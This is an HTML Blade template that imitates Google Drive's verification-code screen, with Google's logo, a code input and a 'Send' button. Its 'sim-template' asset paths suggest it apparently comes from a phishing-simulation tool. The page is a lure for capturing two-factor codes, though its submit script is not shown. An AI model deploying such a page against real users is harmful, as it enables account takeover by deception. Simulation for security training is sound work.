<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Drive</title>

    <!-- CSS style and font-->
    <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">

    <!-- Alpine JS -->
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <link rel="stylesheet" href="{{ asset('build/assets/app-7ywPSvxu.css') }}">

    <link rel="stylesheet" href="{{ asset('css/sim-template/googledrive/verification.css') }}">
    <script src="{{ asset('js/sim-template/googledrive/verification.js') }}" defer></script>
  </head>
  <body>
    <div class="login-container">
      <div class="left-section">
        <div class="google-logo">
          <img
            src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
            alt="Google Logo"
          />
        </div>
        <div class="login-header">Verification Code</div>
        <div class="login-subtitle">
          Enter the verification code to continue to Google Drive
        </div>
      </div>
      <div class="right-section">
        <div class="input-container">
          <input
            type="text"
            class="input-field"
            id="verificationCode"
            placeholder="Enter your code"
          />
          <label for="verificationCode" class="floating-label">
            Enter the verification code
          </label>
          <p id="error-text" class="error-text" style="display: none;">Please enter the verification code.</p>
        </div>
        <div class="action-container">
          <button class="next-button">Send</button>
        </div>
      </div>
    </div>
    <div class="footer-container">
      <div class="language-dropdown-container">
        <button id="languageDropdown" class="language-dropdown">
          English (United States)
          <span id="dropdownArrow" class="dropdown-arrow">▼</span>
        </button>
        <div id="dropdownMenu" class="dropdown-menu">
          <div class="dropdown-item selected" data-lang="en">
            English (United States)
          </div>
          <div class="dropdown-item" data-lang="en-uk">
            English (United Kingdom)
          </div>
          <div class="dropdown-item" data-lang="de">Deutsch</div>
          <div class="dropdown-item" data-lang="es-es">Español (España)</div>
          <div class="dropdown-item" data-lang="es-la">
            Español (Latinoamérica)
          </div>
          <div class="dropdown-item" data-lang="et">eesti</div>
          <div class="dropdown-item" data-lang="fil">Filipino</div>
          <div class="dropdown-item" data-lang="fr-ca">Français (Canada)</div>
          <div class="dropdown-item" data-lang="id">Bahasa Indonesia</div>
        </div>
      </div>
      <div class="TNC">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>
  </body>
</html>
